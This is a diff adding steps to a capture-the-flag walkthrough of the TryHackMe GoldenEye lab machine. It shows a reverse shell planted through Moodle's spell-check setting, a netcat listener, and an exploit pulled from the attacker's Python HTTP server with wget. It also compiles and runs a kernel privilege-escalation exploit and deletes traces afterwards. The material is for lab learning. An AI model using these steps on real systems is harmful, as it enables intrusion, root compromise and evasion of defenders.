@@ -133,7 +133,58 @@ I also got an internal domain information from this email to work on next.
 
 ## **Task 3: GoldenEye Operators Training**
 
+The instruction from the previous image said told me to modify the DNS record. For Linux, go to `/etc/hosts` and add the `<target_IP>` as `<the_server_name>` in the instruction from that image.
+
+To do that, just type `cat /etc/hosts` to see the current DNS record in terminal.
+Then, `sudo nano /etc/hosts`. To modify this file, a root permission is needed. If you aren't sure, try it without `sudo` and if it fail, then retry it with `sudo`. Of course, you can use any editor you like. I prefer `nano` because of its simplicity.
+
 ![modifyDNS](Screenshots/THM_GoldenEye_13_modifyDNS-etc-hosts-file.png)
+
+Once I have modified the DNS record on `/etc/hosts`, I can navigate to the internal url mentioned earlier. As you can see, GoldenEye Operators Training was a Moodle service.
+
+![MoodleLoginPage](Screenshots/THM_GoldenEye_14_ableToSeeTheInternalSite.png)
+
+Now I use Xenia's credential to log into the Moodle GoldenEye Operator Training.
+
+![loginMoodleWithXeniaCred](Screenshots/THM_GoldenEye_15_loginMoodleWithXeniaCred.png)
+
+Now you can see Xenia's public profile.
+
+![XeniaMoodleProfileWithEmailExposure](Screenshots/THM_GoldenEye_16_xeniaMoodleProfileWithEmailExposure.png)
+
+![foundDrDrakeOnXeniaMoodleAccount](Screenshots/THM_GoldenEye_17_foundDrDoakOnXeniaMoodleAccount.png)
+
+![messagesBetweenXeniaAndDoak](Screenshots/THM_GoldenEye_18_messagesBetweenXeniaAndDoak.png)
+
+![messagesBetweenXeniaAndDoak2](Screenshots/THM_GoldenEye_18_messagesBetweenXeniaAndDoak2.png)
+
+![doakPassPOP3](Screenshots/THM_GoldenEye_19_doakPassPOP3.png)
+
+![loginDoakPOP3AndFoundNewCred](Screenshots/THM_GoldenEye_20_loginDoakPOP3AndFoundNewCred.png)
+
+![drDoakMoodleProfile](Screenshots/THM_GoldenEye_21_drDoakMoodleProfile.png)
+
+![drDoakSecretFile4James](Screenshots/THM_GoldenEye_22_drDoakSecretFile4James.png)
+
+![foundAdminUser](Screenshots/THM_GoldenEye_23_foundAdminUser.png)
+
+![secrettextTo007](Screenshots/THM_GoldenEye_24_secrettextTo007.png)
+
+![dir007keyFor007Pic](Screenshots/THM_GoldenEye_25_dir007keyFor007Pic.png)
+
+![useExifOnFor007Pic](Screenshots/THM_GoldenEye_26_useExifOnFor007Pic.png)
+
+![loginMoodleAsAdmin](Screenshots/THM_GoldenEye_27_loginMoodleAsAdmin.png)
+
+![useBurpToDecodeTheEncodeMessageFromDoak_Base64](Screenshots/THM_GoldenEye_27_useBurpToDecodeTheEncodedMessageFromDoak_Base64.png)
+
+![allUsers](Screenshots/THM_GoldenEye_28_allUsers.png)
+
+![BorisIsAdmin](Screenshots/THM_GoldenEye_29_BorisIsAdmin.png)
+
+![AddRevShellCodeToAspellAndChangeSpellEngineToPSpellShell](Screenshots/THM_GoldenEye_30_AddRevShellCodeToAspellAndChangeSpellEngineToPSpellShell.png)
+
+![spellCheck](Screenshots/THM_GoldenEye_31_spellCheck.png)
 
 ***Q8: Try using the credentials you found earlier. Which user can you login as?***
 ***A8: xenia***
@@ -162,14 +213,85 @@ I also got an internal domain information from this email to work on next.
 
 ## **Task 4: Privilege Escalation**
 
+I got the shell by setup `netcat` listening port. The command was `nc -lvnp <port>`. Once I got the shell, I checked which user I got the shell as. If I got root user, that would be awesome, but in this case I only got `www-data` as the user.
+
+I also check where I am in directories structure using `pwd`.
+
+![igotAShell](Screenshots/THM_GoldenEye_32_igotashell.png)
+
+The instruction suggested us to use [linuxprivchecker.py](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) to check privilege escalation vectors. You can also maually check all of them.
+
+From this point we will use this shell to receive the `linuxprivchecker.py` file so do not close this shell or this tab on terminal on our kali machine.
+
+In order to send a file to the target machine, we start off by setting up a python server to deliver the file. The command from the instruction was a little too outdated. 
+The command below is the most current one at the moment of writing this walkthrough.
+
+On another tab on terminal of our kali machine, type this command on terminal `python3 -m http.server <port>` to setup a python server to deliver a file. Note that this command use Python3 while the command on TryHackMe based on Python2 which was deprecated. We can choose any port we want as long as that port isn't currently occupied on our kali machine. I chose port `8080`.
+
+Open the web browser and navigate to `http://<kali_IP>:<kali_python_server_port>/<malicious_file>` to download the file or files. Alternatively, you can use `curl`or `wget` to download those files one at a time via commandline.
+
+As you can see from the screnshot below, `<target_IP> --[date_time] "GET /<filename> HTTP/1.1" 200 -`, `200` indicated a successful download using `GET` method of `HTTP`.
+
+![setupPythonServer](Screenshots/THM_GoldenEye_33_setupPythonServer.png)
+
+The instruction told me to check the kernel version. To do that, use the command `uname -a`.
+
+![checkKernelVersion](Screenshots/THM_GoldenEye_34_checkKernelVersion.png)
+
 ***Q13: Whats the kernel version?***
 ***Hint: `uname -a`***
 ***A13: 3.13.0-32-generic***
 
-You can download the exploit from here: [exploit](https://www.exploit-db.com/exploits/37292)
+In addition to the `linuxprivchecker.py` file, the instruction suggested to use this specific exploit in which this kernel version is vulnerable to. [This Exploit](https://www.exploit-db.com/exploits/37292)
+
+Switch tab to our target shell from earlier that I told you not to close it and check if the target machine has receieved the files or not using `ls` command. 
+
+As you can see below in the screenshot, I have successfully delivered the `linuxprivchecker.py` which is useful to check linux privilege escalation vectors and `<number.c>` file which is the exploit file written in C language. 
+
+![downloadFilesFromMyKali](Screenshots/THM_GoldenEye_35_downloadFilesFromMyKali.png)
 
 ***Fix the exploit to work with the system you're trying to exploit. Remember, enumeration is your key!***
 ***What development tools are installed on the machine?***
+
+According to this hint from TryHackMe, I typed `which gcc` and found nothing so I typed `which cc` and got the result. This means the target machine has `cc` compiler instead of `gcc`. This is the enumeration part that the instruction told me.
+
+The instruction said I need to alter only one character to make it usable. I struggled several times. I thought I needed to use `gcc` to compile the exploit file, but the target machine only have `cc` complier. The original exploit file was written to use `gcc`. 
+
+I have to fine the line that wrote `gcc` and change it to `cc`. I made the change using `nano` as shown in the belowed screenshot. This screenshot is the original exploit.
+
+I tried to send the exploit to the target machine and tried to alter it there, but the `www-data` user did not have accessed to `nano` so I had to make the change on my kali machine and deliver it to the target machine to complie and use there.
+
+This is the original exploit code.
+
+![originalExploitFileUseGCC](Screenshots/THM_GoldenEye_36_originalExploitFileUseGCC.png)
+
+This is after the 1 character altered.
+
+![changeGCCtoCC](Screenshots/THM_GoldenEye_36_changeGCCtoCC.png)
+
+After altering the code with only 1 character as instructed, I delivered it to the target machine using the same method, the python HTTP server.
+
+As you can see, the file was downloaded using `wget http://<kali_IP>:<kali_python_server_port>/<exploit_file>`.
+
+![sendingTheExploitAfterMakingChangeToIt](Screenshots/THM_GoldenEye_37_sendingTheExploitAfterMakingChangeToIt.png)
+
+Use `cc` to compile the exploit file with this command `cc <exploit.c> -o <exploit_name>`.
+
+Then, `./exploit` to run the exploit. Note that `./<filename>` is a way to run a file on a linux machine from commandline. Wait to receieve the shell as `root`.
+
+As you can see, the shell started with `#` indicated that right now I have successfully gain `root` access.
+
+![successfulExploitRunningGainRoot](Screenshots/THM_GoldenEye_38_successfulExploitRuningGainRoot.png)
+
+To verify that I am actually `root`, I can use `whoami` or `id` to verify that I am `root`. 
+
+Before moving on, it is a good practice to remove my trace so I cleanned up after myself by deleting the 2 files that I sent to the target machine and file I compiled from the exploit.
+
+Doing so is a good practice in term of staying hidden to simulate that a real world attacker is likely going to erase their trace that they have compromised the target machine. Even if the penetration tester does not need to conseal their present, it is still a good practice to clean up for the blue team of the company as well as not leave any usable code for the real attacker if they can compromise the machine so they can further compromise it easier.
+
+This screenshot showed that I removed the files I delivered and created before heading to get root flag in the `/root` directory.
+
+![iCleanItUp](Screenshots/THM_GoldenEye_39_icleanitup.png)
 
 Getting the root flag. As you can see here, everything inside `/root` directory was hidden. In oder to see them on screen, use `ls -la`.
 
@@ -191,6 +313,6 @@ The command was `cat <file>`.
 
 Thank you so much for reading this till the end.
 
-***Sangsongthong***
+***Sangsongthong - Hexterika Cyber Lab***
 
 <!--The image path shouldn't have / in front of Screenshots.I made a mistake by typing /Screenshots instead of Screenshots making the images not display properly on GitHub even though I can see them on the preview on my local machine. This comment is invisible, by the way.-->
